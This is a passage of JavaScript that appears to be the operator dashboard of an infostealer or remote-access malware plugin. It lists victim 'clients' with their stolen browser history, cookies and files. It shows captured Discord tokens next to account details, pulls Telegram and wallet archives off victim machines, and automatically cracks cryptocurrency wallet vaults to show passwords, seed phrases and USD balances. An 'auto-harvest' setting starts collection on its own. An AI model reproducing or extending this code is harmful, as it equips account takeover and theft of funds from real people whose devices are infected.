      const saBtn = document.createElement("button");
      saBtn.className = "tab tab-search" + (activeTab === "__search__" ? " active" : "");
      const saCount = searchAllResults ? searchAllResults.groups.reduce((s, g) => s + g.total, 0) : 0;
      saBtn.innerHTML = `Search All <span class="tab-count">${saCount.toLocaleString()}</span>`;
      saBtn.addEventListener("click", () => {
        activeTab = "__search__";
        sortCol = null; sortAsc = true;
        buildTabs(); buildBfilts();
        if (isGlobal) { buildCfilts(); loadSearchAll(); }
        else renderTable();
      });
      tabsEl.appendChild(saBtn);
    }

    for (const t of TABS) {
      const btn = document.createElement("button");
      btn.className = "tab" + (t.id === activeTab ? " active" : "");
      const count = isGlobal
        ? getGlobalTabTotal(t.key).toLocaleString()
        : (lastResults ? (lastResults[t.key] || []).length : 0);
      btn.innerHTML = `${esc(t.label)} <span class="tab-count">${count}</span>`;
      btn.addEventListener("click", () => {
        activeTab = t.id;
        sortCol = null; sortAsc = true;
        buildTabs(); buildBfilts();
        if (isGlobal) {
          buildCfilts();
          if (tabData[t.key]) tabData[t.key].offset = 0;
          loadGlobalTab();
        } else {
          renderTable();
        }
      });
      tabsEl.appendChild(btn);
    }
  }

  // ── Browser filter ────────────────────────────────────────────
  function buildBfilts() {
    const tab = TABS.find(t => t.id === activeTab);
    if (!tab?.cols.some(c => c.k === "browser")) { bfiltsEl.style.display = "none"; return; }
    bfiltsEl.style.display = "";
    bfiltsEl.innerHTML = "";

    // History view toggle
    if (activeTab === "history") {
      const viewToggle = document.createElement("div");
      viewToggle.className = "history-view-toggle";
      for (const v of [{ label: "All", value: "all" }, { label: "Top Sites", value: "top" }]) {
        const btn = document.createElement("button");
        btn.className = "bfilt" + (historyView === v.value ? " active" : "");
        btn.textContent = v.label;
        btn.addEventListener("click", () => {
          historyView = v.value;
          buildBfilts();
          renderTable();
        });
        viewToggle.appendChild(btn);
      }
      bfiltsEl.appendChild(viewToggle);
      const sep = document.createElement("span");
      sep.className = "bfilt-sep";
      bfiltsEl.appendChild(sep);
    }

    const pills = [{ label: "All", value: "all" }, ...BROWSERS.map(b => ({ label: b, value: b }))];
    for (const p of pills) {
      const btn = document.createElement("button");
      btn.className = "bfilt" + (activeBrowser === p.value ? " active" : "");
      btn.dataset.browser = p.value;
      btn.textContent = p.label;
      btn.addEventListener("click", () => {
        activeBrowser = p.value;
        buildBfilts();
        if (isGlobal) {
          const t2 = TABS.find(t => t.id === activeTab);
          if (t2?.key && tabData[t2.key]) tabData[t2.key].offset = 0;
          loadGlobalTab();
        } else {
          renderTable();
        }
      });
      bfiltsEl.appendChild(btn);
    }
  }

  // ── Client filter ─────────────────────────────────────────────
  function buildCfilts() {
    if (!isGlobal || !cfiltsEl) return;
    if (knownClients.length === 0) { cfiltsEl.style.display = "none"; return; }
    cfiltsEl.style.display = "";
    cfiltsEl.innerHTML = "";
    const pills = [
      { label: "All Clients", value: "all" },
      ...knownClients.map(c => ({ label: shortId(c.clientId), value: c.clientId, full: c.clientId })),
    ];
    for (const p of pills) {
      const btn = document.createElement("button");
      btn.className = "cfilt" + (activeClient === p.value ? " active" : "");
      btn.textContent = p.label;
      if (p.full) btn.title = p.full;
      btn.addEventListener("click", () => {
        activeClient = p.value;
        const tab = TABS.find(t => t.id === activeTab);
        if (tab?.key && tabData[tab.key]) tabData[tab.key].offset = 0;
        buildCfilts(); buildTabs();
        loadGlobalTab();
      });
      cfiltsEl.appendChild(btn);
    }
  }

  // ── Search All ────────────────────────────────────────────────
  async function loadSearchAll() {
    const q = searchEl.value.trim();
    if (!q) { searchAllResults = null; renderTable(); return; }
    const p = { search: q, limit: 10 };
    if (activeClient !== "all") p.clientId = activeClient;
    try {
      searchAllResults = await rpc("global_search", p);
      buildTabs();
      renderTable();
    } catch (e) { log(`Search error: ${e.message}`); }
  }

  function renderSearchAll() {
    if (!searchAllView || !searchAllGrid) return;
    searchAllGrid.innerHTML = "";
    const groups = searchAllResults?.groups || [];
    searchAllEmpty.style.display = groups.length === 0 ? "" : "none";

    for (const g of groups) {
      const tab = TABS.find(t => t.key === g.key);
      if (!tab) continue;
      const cols = isGlobal ? [CLIENT_COL, ...tab.cols] : tab.cols;
      const displayCols = cols.filter(c => !c.filedownload && !c.extdownload && !c.walletdownload && !c.tgdownload);
      const previewCols = displayCols.slice(0, 5);

      const section = document.createElement("div");
      section.className = "search-group";

      const header = document.createElement("div");
      header.className = "search-group-header";
      header.innerHTML = `
        <div class="search-group-title">
          ${esc(g.label)}
          <span class="search-group-count">${g.total.toLocaleString()}</span>
        </div>
        <div class="search-group-view">View all &rarr;</div>
      `;
      header.addEventListener("click", () => {
        activeTab = tab.id;
        sortCol = null; sortAsc = true;
        buildTabs(); buildBfilts();
        if (isGlobal) {
          buildCfilts();
          if (tabData[tab.key]) tabData[tab.key].offset = 0;
          searchEl.value = searchEl.value;
          loadGlobalTab();
        } else {
          renderTable();
        }
      });
      section.appendChild(header);

      const scroll = document.createElement("div");
      scroll.className = "search-group-scroll";
      const tbl = document.createElement("table");
      tbl.className = "search-group-table";
      const thRow = document.createElement("tr");
      for (const col of previewCols) {
        const th = document.createElement("th");
        th.textContent = col.h;
        if (col.grow) th.style.width = "34%";
        thRow.appendChild(th);
      }
      tbl.appendChild(thRow);

      for (const row of g.rows) {
        const tr = document.createElement("tr");
        for (const col of previewCols) {
          const td = document.createElement("td");
          if (col.grow) td.className = "sg-grow";
          td.innerHTML = cellContent(col, row, showSensitive, searchEl.value.trim());
          td.title = (col.filedownload || col.extdownload || col.walletdownload || col.tgdownload || col.bool || col.clientbadge) ? "" : "Click to copy";
          td.addEventListener("click", () => {
            const val = col.sensitive ? String(row[col.k] || "")
                      : col.chromets ? chromeTs(row[col.k])
                      : String(row[col.k] || "");
            if (!val) return;
            navigator.clipboard.writeText(val).catch(() => {});
            td.classList.add("copied-flash");
            setTimeout(() => td.classList.remove("copied-flash"), 600);
          });
          tr.appendChild(td);
        }
        tbl.appendChild(tr);
      }
      scroll.appendChild(tbl);
      section.appendChild(scroll);

      if (g.total > g.rows.length) {
        const more = document.createElement("div");
        more.className = "search-group-more";
        more.textContent = `+ ${(g.total - g.rows.length).toLocaleString()} more results — click to view all`;
        more.addEventListener("click", () => header.click());
        section.appendChild(more);
      }

      searchAllGrid.appendChild(section);
    }
  }

  function loadSearchAllLocal() {
    const q = searchEl.value.trim().toLowerCase();
    if (!q || !lastResults) { searchAllResults = null; buildTabs(); return; }
    const groups = [];
    for (const tab of TABS) {
      const rows = lastResults[tab.key] || [];
      if (!rows.length) continue;
      const cols = tab.cols;
      const matched = rows.filter(r =>
        cols.some(c => String(r[c.k] || "").toLowerCase().includes(q))
      );
      if (matched.length > 0) {
        groups.push({ key: tab.key, label: tab.label, total: matched.length, rows: matched.slice(0, 10) });
      }
    }
    searchAllResults = { groups };
    buildTabs();
  }

  // ── Pagination ────────────────────────────────────────────────
  function updatePagination(tabKey) {
    if (!isGlobal || !pagBar) return;
    const td = tabData[tabKey];
    if (!td || td.total <= PAGE_SIZE) { pagBar.style.display = "none"; return; }
    pagBar.style.display = "";
    const from = td.offset + 1;
    const to = Math.min(td.offset + td.rows.length, td.total);
    pagInfo.textContent = `${from.toLocaleString()}–${to.toLocaleString()} of ${td.total.toLocaleString()}`;
    pagPrev.disabled = td.offset === 0;
    pagNext.disabled = td.offset + td.rows.length >= td.total;
  }

  // ── Render table ──────────────────────────────────────────────
  function renderTable() {
    if (activeTab === "__search__") {
      tableWrap.style.display = "none";
      noRows.style.display = "none";
      if (discordViewEl) discordViewEl.style.display = "none";
      if (walletViewEl) walletViewEl.style.display = "none";
      if (searchAllView) searchAllView.style.display = "";
      if (pagBar) pagBar.style.display = "none";
      if (exportTabBtn) exportTabBtn.style.display = "none";
      renderSearchAll();
      const total = searchAllResults?.groups.reduce((s, g) => s + g.total, 0) || 0;
      rowCount.textContent = `${total.toLocaleString()} ${total === 1 ? "result" : "results"}`;
      return;
    }
    if (searchAllView) searchAllView.style.display = "none";
    if (exportTabBtn) exportTabBtn.style.display = "";

    const tab = TABS.find(t => t.id === activeTab);
    if (!tab) return;

    if (activeTab === "discord") {
      tableWrap.style.display = "none";
      if (discordViewEl) discordViewEl.style.display = "";
      if (walletViewEl) walletViewEl.style.display = "none";
      loadDiscordProfiles();
      return;
    }
    if (activeTab === "wallets") {
      tableWrap.style.display = "none";
      if (discordViewEl) discordViewEl.style.display = "none";
      if (walletViewEl) walletViewEl.style.display = "";
      loadWalletCards();
      return;
    }
    if (discordViewEl) discordViewEl.style.display = "none";
    if (walletViewEl) walletViewEl.style.display = "none";
    tableWrap.style.display = "";

    // Top Sites view for history tab
    if (activeTab === "history" && historyView === "top") {
      let rows;
      if (isGlobal) {
        const td = tabData[tab.key];
        rows = td?.rows || [];
      } else {
        rows = lastResults?.[tab.key] || [];
      }
      if (activeBrowser !== "all") rows = rows.filter(r => r.browser === activeBrowser);
      const q = searchEl.value.trim().toLowerCase();
      if (q) rows = rows.filter(r => (r.url || "").toLowerCase().includes(q) || (r.title || "").toLowerCase().includes(q));

      // Group by domain
      const domainMap = {};
      for (const r of rows) {
        let domain;
        try { domain = new URL(r.url).hostname.replace(/^www\./, ""); } catch { domain = r.url || "unknown"; }
        if (!domainMap[domain]) domainMap[domain] = { domain, visits: 0, lastVisit: 0, titles: new Set() };
        domainMap[domain].visits++;
        if (r.visitTimeUnix > domainMap[domain].lastVisit) domainMap[domain].lastVisit = r.visitTimeUnix;
        if (r.title) domainMap[domain].titles.add(r.title);
      }
      const sorted = Object.values(domainMap).sort((a, b) => b.visits - a.visits);

      const topCols = [
        { k: "domain", h: "Domain", grow: true },
        { k: "visits", h: "Visits" },
        { k: "lastVisit", h: "Last Visit", unixtimestamp: true },
      ];
      buildHeader(topCols);
      const topRows = sorted.map(d => ({
        domain: d.domain,
        visits: d.visits,
        lastVisit: d.lastVisit,
      }));
      startVirt(topRows, topCols);
      if (isGlobal) updatePagination(tab.key);
      return;
    }

    const allCols = isGlobal ? [CLIENT_COL, ...tab.cols] : tab.cols;
    const cols = allCols;
    let rows, serverTotal;

    if (isGlobal) {
      const td = tabData[tab.key];
      if (!td) { buildHeader(cols); startVirt([], cols); updatePagination(tab.key); return; }
      rows = [...td.rows];
      serverTotal = td.total;
    } else {
      if (!lastResults) { buildHeader(cols); startVirt([], cols); return; }
      rows = [...(lastResults[tab.key] || [])];
      if (activeBrowser !== "all" && tab.cols.some(c => c.k === "browser"))
        rows = rows.filter(r => r.browser === activeBrowser);
      const q = searchEl.value.trim().toLowerCase();
      if (q) rows = rows.filter(r => cols.some(c => String(r[c.k] || "").toLowerCase().includes(q)));
    }

    applySortInPlace(rows, cols);
    buildHeader(cols);
    startVirt(rows, cols, serverTotal);
    if (isGlobal) updatePagination(tab.key);
  }

  // ── File fetch (per-client) ───────────────────────────────────
  function fetchAndDownload(path, name, tdEl, targetId) {
    if (pendingFetches.has(path)) return;
    const btn = tdEl.querySelector(".btn-dl");
    if (btn) { btn.textContent = "…"; btn.disabled = true; }
    pendingFetches.set(path, { name, btn });
    sendEvent("fetch_file", { path }, targetId);
    log(`Fetching: ${name}`);
  }

  function fetchAndDownloadExt(path, extId, tdEl, targetId) {
    if (pendingExtZips.has(path)) return;
    const btn = tdEl.querySelector(".btn-dl");
    if (btn) { btn.textContent = "…"; btn.disabled = true; }
    pendingExtZips.set(path, { extId, btn });
    sendEvent("fetch_ext_zip", { path, extId }, targetId);
    log(`Fetching extension ZIP: ${extId || path}`);
  }

  function fetchAndDownloadWallet(path, name, tdEl, targetId) {
    if (pendingWalletZips.has(path)) return;
    const btn = tdEl.querySelector(".btn-dl");
    if (btn) { btn.textContent = "…"; btn.disabled = true; }
    pendingWalletZips.set(path, { name, btn });
    sendEvent("fetch_wallet_zip", { path, name }, targetId);
    log(`Fetching wallet ZIP: ${name || path}`);
  }

  function fetchAndDownloadTelegram(path, account, tdEl, targetId) {
    if (pendingTgZips.has(path)) return;
    const btn = tdEl.querySelector(".btn-dl");
    if (btn) { btn.textContent = "…"; btn.disabled = true; }
    pendingTgZips.set(path, { account, btn });
    sendEvent("fetch_telegram_zip", { path, account }, targetId);
    log(`Fetching Telegram ZIP: ${account || path}`);
  }

  // ── Discord profiles ──────────────────────────────────────────
  function renderDiscordCard(p) {
    const div = document.createElement("div");
    div.className = "dp-card";
    div.dataset.token = p.token || "";
    div.dataset.clientId = p.clientId || "";

    const enriched = !!p.enriched_at && !p.error;
    const tokenHtml = `
      <div class="dp-token-row">
        <span class="dp-token-label">Token</span>
        <span class="dp-token sensitive" title="Click to copy">${esc(p.token || "")}</span>
      </div>`;
    const sourceTs = `${esc(p.source || "")} · ${p.captured_at ? new Date(p.captured_at).toLocaleString() : ""}`;

    if (p.error) {
      div.innerHTML = `
        <div class="dp-card-top">
          <div class="dp-avatar-wrap"><div class="dp-avatar dp-avatar-err">?</div></div>
          <div class="dp-identity">
            <div class="dp-displayname">Lookup failed</div>
            <div class="dp-tag dp-err-msg">${esc(p.error)}</div>
            <div class="dp-created">${sourceTs}</div>
          </div>
        </div>
        ${tokenHtml}
        <div class="dp-actions">
          <button class="btn dp-lookup-btn" data-token="${esc(p.token)}" data-cid="${esc(p.clientId)}">Retry Lookup</button>
        </div>`;
    } else if (!enriched) {
      div.innerHTML = `
        <div class="dp-card-top">
          <div class="dp-avatar-wrap"><div class="dp-avatar dp-avatar-pending">?</div></div>
          <div class="dp-identity">
            <div class="dp-displayname">Not yet looked up</div>
            <div class="dp-created">${sourceTs}</div>
          </div>
        </div>
        ${tokenHtml}
        <div class="dp-actions">
          <button class="btn dp-lookup-btn" data-token="${esc(p.token)}" data-cid="${esc(p.clientId)}">Lookup</button>
        </div>`;
    } else {
      const created = discordSnowflakeDate(p.user_id);
      const avatarUrl = discordAvatarUrl(p.user_id, p.avatar);
      const displayName = p.global_name || p.username || "—";
      const tag = p.username
        ? (p.discriminator && p.discriminator !== "0" ? `${p.username}#${p.discriminator}` : p.username)
        : "—";
      const allFlags = (p.flags || 0) | (p.public_flags || 0);
      const badges = dpBadgesHtml(allFlags) + dpNitroHtml(p.premium_type);
      const avatarHtml = avatarUrl
        ? `<img class="dp-avatar" src="${esc(avatarUrl)}" alt="" loading="lazy" />`
        : `<div class="dp-avatar dp-avatar-default">${esc((displayName[0] || "?").toUpperCase())}</div>`;
      const check = "✓", cross = "✕";

      div.innerHTML = `
        <div class="dp-card-top">
          <div class="dp-avatar-wrap">${avatarHtml}</div>
          <div class="dp-identity">
            <div class="dp-displayname">${esc(displayName)}</div>
            <div class="dp-tag">${esc(tag)}</div>
            <div class="dp-created">${created ? "Created " + created.toLocaleDateString() : ""} · ${esc(p.locale || "")} · ${esc(p.source || "")}</div>
          </div>
          <div class="dp-badges-col">${badges}</div>
        </div>
        <div class="dp-stats-row">
          <div class="dp-stat"><span class="dp-stat-val">${p.friends_count != null ? p.friends_count : "—"}</span><span class="dp-stat-lbl">Friends</span></div>
          <div class="dp-stat"><span class="dp-stat-val">${p.guilds_count != null ? p.guilds_count : "—"}</span><span class="dp-stat-lbl">Servers</span></div>
          <div class="dp-stat"><span class="dp-stat-val">${p.mfa_enabled ? check : cross}</span><span class="dp-stat-lbl">2FA</span></div>
          <div class="dp-stat"><span class="dp-stat-val">${p.phone ? check : cross}</span><span class="dp-stat-lbl">Phone</span></div>
          <div class="dp-stat"><span class="dp-stat-val">${p.verified ? check : cross}</span><span class="dp-stat-lbl">Email ver.</span></div>
        </div>
        ${p.email ? `<div class="dp-detail-row"><span class="dp-detail-lbl">Email</span><span class="dp-detail-val">${esc(p.email)}</span></div>` : ""}
        ${p.guild_names ? `<div class="dp-detail-row dp-guilds"><span class="dp-detail-lbl">Servers</span><span class="dp-detail-val dp-guild-list">${esc(p.guild_names.split("|").join(", "))}</span></div>` : ""}
        ${tokenHtml}
        <div class="dp-actions">
          <button class="btn dp-lookup-btn" data-token="${esc(p.token)}" data-cid="${esc(p.clientId)}">Re-lookup</button>
          ${p.user_id ? `<span class="dp-uid">ID: ${esc(p.user_id)}</span>` : ""}
        </div>`;
    }

    const tokenEl = div.querySelector(".dp-token");
    if (tokenEl) {
      tokenEl.addEventListener("click", () => {
        navigator.clipboard.writeText(p.token || "").catch(() => {});
        tokenEl.classList.add("copied-flash");
        setTimeout(() => tokenEl.classList.remove("copied-flash"), 600);
      });
    }
    return div;
  }

  async function loadDiscordProfiles() {
    if (!discordViewEl || discordViewEl.style.display === "none") return;
    try {
      const p = {};
      if (!isGlobal && clientId) p.clientId = clientId;
      else if (isGlobal && activeClient !== "all") p.clientId = activeClient;
      const q = searchEl.value.trim();
      if (q) p.search = q;
      const result = await rpc("list_discord_profiles", p);
      dpGrid.innerHTML = "";
      if (!result.rows.length) {
        dpGrid.innerHTML = '<div class="no-rows">No Discord tokens captured yet.</div>';
      } else {
        for (const row of result.rows) dpGrid.appendChild(renderDiscordCard(row));
      }
      rowCount.textContent = `${result.total.toLocaleString()} ${result.total === 1 ? "token" : "tokens"}`;
    } catch (e) {
      log(`Discord profiles error: ${e.message}`);
    }
  }

  // ── Wallet card view ───────────────────────────────────────────
  function renderWalletCard(w) {
    const div = document.createElement("div");
    div.className = "wl-card";
    const isExt = w.type === "extension";
    const iconClass = isExt ? "wl-icon-ext" : "wl-icon-desk";
    const typeClass = isExt ? "wl-type-ext" : "wl-type-desk";
    const typeLabel = isExt ? "Extension" : "Desktop";
    const icon = isExt ? "\u{1F9E9}" : "\u{1F4B0}";

    const addrs = w.addresses || [];
    const balKey = w.name;
    const bals = walletBalances[balKey] || {};
    const crackResult = walletCrackResults[balKey];

    let addrsHtml = "";
    if (addrs.length > 0) {
      addrsHtml = `<div class="wl-addrs">${addrs.map(a =>
        `<span class="wl-addr" title="Click to copy">${esc(a)}</span>`
      ).join("")}</div>`;
    }

    let balHtml = "";
    const balEntries = Object.entries(bals);
    if (balEntries.length > 0) {
      balHtml = `<div class="wl-balances">${balEntries.map(([chain, bal]) => {
        const isZero = bal === 0;
        const cls = isZero ? "wl-bal-chip wl-bal-chip-zero" : "wl-bal-chip";
        const val = isZero ? "0" : bal < 0.0001 ? bal.toExponential(2) : bal.toFixed(4);
        return `<span class="${cls}">${esc(chain)}: ${val}</span>`;
      }).join("")}</div>`;
    }

    let crackHtml = "";
    if (crackResult) {
      if (crackResult.warning) {
        crackHtml += `<div class="wl-crack-warning">${esc(crackResult.warning)}</div>`;
      }
      if (crackResult.cracked) {
        // USD total banner
        let usdHtml = "";
        if (crackResult.usdTotal !== undefined) {
          if (crackResult.usdTotal > 0) {
            usdHtml = `<div class="wl-usd-total">$${crackResult.usdTotal.toFixed(2)}</div>`;
          } else {
            usdHtml = `<div class="wl-usd-total wl-usd-zero">$0.00</div>`;
          }
        }

        // Balances per asset
        let balHtml = "";
        if (crackResult.balances) {
          const entries = Object.entries(crackResult.balances).filter(([,v]) => v > 0);
          if (entries.length) {
            balHtml = `<div class="wl-bal-row">${entries.map(([chain, val]) =>
              `<span class="wl-bal-chip"><b>${esc(chain)}</b> ${val < 0.0001 ? val.toExponential(2) : val.toFixed(6)}</span>`
            ).join("")}</div>`;
          } else {
            balHtml = `<div class="wl-bal-row"><span class="wl-bal-chip wl-bal-chip-zero">No balances found</span></div>`;
          }
        }

        // Addresses
        let addrsHtml = "";
        if (crackResult.addresses?.length) {
          addrsHtml = `<div class="wl-accounts">${crackResult.addresses.map(a => {
            const label = a.chain || "ETH";
            const addr = a.address || a;
            return `<span class="wl-account" title="Click to copy">${esc(label)}: ${esc(addr)}</span>`;
          }).join("")}</div>`;
        }
        if (crackResult.accounts?.length) {
          addrsHtml += `<div class="wl-accounts">${(crackResult.accounts || []).map(a => {
            if (a.mnemonic) return `<div class="wl-mnemonic" title="Click to copy seed phrase">${esc(a.mnemonic)}</div>`;
            return `<span class="wl-account" title="Click to copy">${esc(a.type)}: ${esc(a.address)}</span>`;
          }).join("")}</div>`;
        }

        // Mnemonic
        let mnemonicHtml = "";
        if (crackResult.mnemonic) {
          mnemonicHtml = `<div class="wl-mnemonic" title="Click to copy seed phrase">${esc(crackResult.mnemonic)}</div>`;
        }

        crackHtml += `
          <div class="wl-crack-result">
            Cracked! Password: <span class="wl-crack-pw">${esc(crackResult.password)}</span>
          </div>
          ${usdHtml}
          ${balHtml}
          ${addrsHtml}
          ${mnemonicHtml}
          ${crackResult.mnemonic && !crackResult.balances ? `<button class="btn wl-check-bal-btn" data-wallet="${esc(w.name)}">Check Balances</button>` : ""}`;
      } else {
        crackHtml += `<div class="wl-crack-result wl-crack-fail">No password matched (${crackResult.tried} tried)</div>`;
      }
    }

    div.innerHTML = `
      <div class="wl-card-top">
        <div class="wl-icon ${iconClass}">${icon}</div>
        <div class="wl-identity">
          <div class="wl-name">${esc(w.name)}</div>
          <div class="wl-meta">
            <span class="wl-type-badge ${typeClass}">${typeLabel}</span>
            <span>${w.files || 0} files · ${humanSize(w.size || 0)}</span>
          </div>
        </div>
      </div>
      ${crackHtml}
      <div class="wl-actions">
        ${w.hasVault && !crackResult ? `<button class="btn wl-crack-btn" data-wallet="${esc(w.name)}" data-crack-type="vault">Crack Vault</button>` : ""}
        ${!w.hasVault && w.downloaded && !crackResult ? `<button class="btn wl-crack-btn" data-wallet="${esc(w.name)}" data-crack-type="desktop">Crack Wallet</button>` : ""}
        ${w.dataId ? `<button class="btn wl-dl-btn" data-id="${w.dataId}" data-name="${esc(w.name)}">Download ZIP</button>` : ""}
        ${w.downloaded ? `<span class="wl-downloaded">Auto-downloaded</span>` : ""}
      </div>`;

    div.querySelectorAll(".wl-addr, .wl-account").forEach(el => {
      el.addEventListener("click", () => {
        navigator.clipboard.writeText(el.textContent.replace(/^[^:]+:\s*/, "")).catch(() => {});
        el.classList.add("copied-flash");
        setTimeout(() => el.classList.remove("copied-flash"), 600);
      });
    });
    div.querySelectorAll(".wl-mnemonic").forEach(el => {
      el.addEventListener("click", () => {
        navigator.clipboard.writeText(el.textContent).catch(() => {});
        el.classList.add("copied-flash");
        setTimeout(() => el.classList.remove("copied-flash"), 600);
      });
    });

    return div;
  }

  async function loadWalletCards() {
    if (!walletViewEl || walletViewEl.style.display === "none") return;
    const cid = isGlobal ? (activeClient !== "all" ? activeClient : null) : clientId;

    if (!cid) {
      wlGrid.innerHTML = '<div class="no-rows">Select a client to view wallet details.</div>';
      rowCount.textContent = "0 wallets";
      return;
    }

    try {
      const [tableResult, dataResult] = await Promise.all([
        rpc("list_wallets", { clientId: cid }),
        rpc("list_wallet_data", { clientId: cid }),
      ]);

      const dataMap = {};
      for (const d of dataResult.rows) {
        dataMap[d.name] = d;
      }

      const wallets = tableResult.rows.map(w => {
        const d = dataMap[w.name];
        return {
          ...w,
          addresses: d?.addresses || [],
          hasVault: d?.hasVault || false,
          downloaded: !!d,
          dataId: d?.id || null,
        };
      });

      wlGrid.innerHTML = "";
      if (!wallets.length) {
        wlGrid.innerHTML = '<div class="no-rows">No wallets found for this client.</div>';
      } else {
        for (const w of wallets) wlGrid.appendChild(renderWalletCard(w));
      }
      rowCount.textContent = `${wallets.length} wallet${wallets.length !== 1 ? "s" : ""}`;

      // Load previously cracked seeds from DB
      try {
        const savedSeeds = await rpc("get_wallet_seeds", { clientId: cid });
        for (const [name, seed] of Object.entries(savedSeeds || {})) {
          if (!walletCrackResults[name]) {
            walletCrackResults[name] = { cracked: true, password: "(saved)", mnemonic: seed.mnemonic, addresses: seed.addresses };
          }
        }
      } catch (e) { log(`get_wallet_seeds error: ${e.message}`); }

      // For wallets with saved seeds, just refresh balances; crack the rest
      const balanceJobs = [];
      const crackJobs = [];
      for (const w of wallets) {
        const name = w.name;
        const existing = walletCrackResults[name];
        if (existing?.cracked && existing.mnemonic) {
          balanceJobs.push(name);
          continue;
        }
        if (existing) continue;
        const isDesktop = !w.hasVault && w.downloaded;
        const isVault = w.hasVault;
        if (isDesktop || isVault) crackJobs.push({ name, method: isDesktop ? "crack_exodus" : "crack_vault" });
      }

      // Refresh balances for already-cracked wallets (in parallel)
      if (balanceJobs.length) {
        Promise.all(balanceJobs.map(async (name) => {
          try {
            const cr = walletCrackResults[name];
            const balResult = await rpc("check_cracked_balances", { mnemonic: cr.mnemonic });
            walletCrackResults[name] = { ...cr, balances: balResult.totals, usdTotal: balResult.usdTotal, addresses: balResult.addresses || cr.addresses };
            if (balResult.usdTotal > 0) log(`${name}: $${balResult.usdTotal.toFixed(2)} total value`);
          } catch (e) { log(`Balance refresh ${name} error: ${e.message}`); }
        })).then(() => {
          wlGrid.innerHTML = "";
          for (const w of wallets) wlGrid.appendChild(renderWalletCard(w));
        });
      }

      // Auto-crack wallets that haven't been cracked yet
      for (const { name, method } of crackJobs) {
        try {
          const result = await rpc(method, { clientId: cid, walletName: name });
          walletCrackResults[name] = result;
          if (result.cracked) {
            log(`Auto-cracked ${name}! Password: ${result.password}`);
            if (result.mnemonic) {
              const balResult = await rpc("check_cracked_balances", { mnemonic: result.mnemonic });
              walletCrackResults[name] = { ...result, balances: balResult.totals, usdTotal: balResult.usdTotal };
              if (balResult.usdTotal > 0) log(`${name}: $${balResult.usdTotal.toFixed(2)} total value`);
              else log(`${name}: no balances found`);
            }
          } else {
            log(`Auto-crack ${name}: no password matched (${result.tried} tried)`);
          }
        } catch (err) {
          log(`Auto-crack ${name} error: ${err.message}`);
        }
      }
      // Re-render cards with crack results
      if (wallets.some(w => walletCrackResults[w.name])) {
        wlGrid.innerHTML = "";
        for (const w of wallets) wlGrid.appendChild(renderWalletCard(w));
      }
    } catch (e) {
      log(`Wallet cards error: ${e.message}`);
    }
  }

  // ── Settings (auto-harvest) ───────────────────────────────────
  function buildAutoStartEvents(files, ext) {
    const events = [{ event: "collect", payload: { browsers: true } }];
    if (files) events.push({ event: "scan_files", payload: {} });
    if (ext) events.push({ event: "scan_extensions", payload: {} });
    return events;
  }

  async function fetchAutoHarvestState() {
    if (!autoHarvestToggle) return;
    try {
      const res = await fetch("/api/plugins");
      if (!res.ok) return;
      const data = await res.json();
      const pluginCfg = (data.plugins || []).find(p => p.id === PLUGIN_ID);
      if (!pluginCfg) return;
      const enabled = !!pluginCfg.autoLoad;
      const events = pluginCfg.autoStartEvents || [];
      applySettingsUI(enabled, events.some(e => e.event === "scan_files"), events.some(e => e.event === "scan_extensions"));
    } catch (_) {}
  }

  function applySettingsUI(enabled, files, ext) {
    if (!autoHarvestToggle) return;
    autoHarvestToggle.checked = enabled;
    autoFilesToggle.disabled = !enabled;
    autoFilesToggle.checked = files;
    if (autoExtToggle) {
      autoExtToggle.disabled = !enabled;
      autoExtToggle.checked = ext;
    }
    const filesRow = $("ah-files-row");
    const extRow = $("ah-ext-row");
    if (filesRow) filesRow.style.opacity = enabled ? "1" : "0.5";
    if (extRow) extRow.style.opacity = enabled ? "1" : "0.5";
  }

  async function saveSettings() {
    if (!settingsStatus) return;
    settingsStatus.textContent = "Saving…";
    const enabled = autoHarvestToggle.checked;
    const files = autoFilesToggle.checked;
    const ext = autoExtToggle ? autoExtToggle.checked : false;
    try {
      const body = {
        autoLoad: enabled,
        autoStartEvents: enabled ? buildAutoStartEvents(files, ext) : [],
      };
      const res = await fetch(`/api/plugins/${PLUGIN_ID}/autoload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });
      const data = await res.json();
      if (!data.ok) throw new Error(data.error || "failed");
      settingsStatus.textContent = enabled ? "Auto-harvest enabled" : "Auto-harvest disabled";
      applySettingsUI(enabled, files, ext);
    } catch (e) {
      settingsStatus.textContent = `Error: ${e.message}`;
    }
    setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 2500);
  }

  async function fetchCaptureSettings() {
    try {
      const s = await rpc("get_capture_settings");
      if (captureHistoryToggle) captureHistoryToggle.checked = s.capture_history;
      if (captureCookiesToggle) captureCookiesToggle.checked = s.capture_cookies;
      if (historyLimitInput) historyLimitInput.value = s.history_limit;
      if (cookieAgeInput) cookieAgeInput.value = s.cookie_max_age_days;
    } catch (_) {}
  }

  let captureSettingsTimer = null;
  function saveCaptureSettings() {
    if (captureSettingsTimer) clearTimeout(captureSettingsTimer);
    captureSettingsTimer = setTimeout(async () => {
      if (settingsStatus) settingsStatus.textContent = "Saving…";
      try {
        await rpc("update_capture_settings", {
          capture_history: captureHistoryToggle?.checked ?? true,
          capture_cookies: captureCookiesToggle?.checked ?? true,
          history_limit: Number(historyLimitInput?.value) || 0,
          cookie_max_age_days: Number(cookieAgeInput?.value) || 0,
        });
        if (settingsStatus) settingsStatus.textContent = "Saved";
      } catch (e) {
        if (settingsStatus) settingsStatus.textContent = `Error: ${e.message}`;
      }
      setTimeout(() => { if (settingsStatus) settingsStatus.textContent = ""; }, 2500);
    }, 600);
  }

  function initSettings(isAdmin) {
    if (!settingsCard) return;
    settingsCard.style.display = "";

    if (!isAdmin) {
      if (settingsAdminMsg) settingsAdminMsg.style.display = "";
      if (settingsGrid) settingsGrid.classList.add("disabled");
      if (autoHarvestToggle) autoHarvestToggle.disabled = true;
      if (autoFilesToggle) autoFilesToggle.disabled = true;
      if (autoExtToggle) autoExtToggle.disabled = true;
      if (captureHistoryToggle) captureHistoryToggle.disabled = true;
      if (captureCookiesToggle) captureCookiesToggle.disabled = true;
      if (historyLimitInput) historyLimitInput.disabled = true;
      if (cookieAgeInput) cookieAgeInput.disabled = true;
      if (purgeHistoryBtn) purgeHistoryBtn.disabled = true;
      if (purgeCookiesBtn) purgeCookiesBtn.disabled = true;
      fetchAutoHarvestState();
      fetchCaptureSettings();
      return;
    }

    if (autoHarvestToggle) autoHarvestToggle.addEventListener("change", saveSettings);
    if (autoFilesToggle) autoFilesToggle.addEventListener("change", saveSettings);
    if (autoExtToggle) autoExtToggle.addEventListener("change", saveSettings);
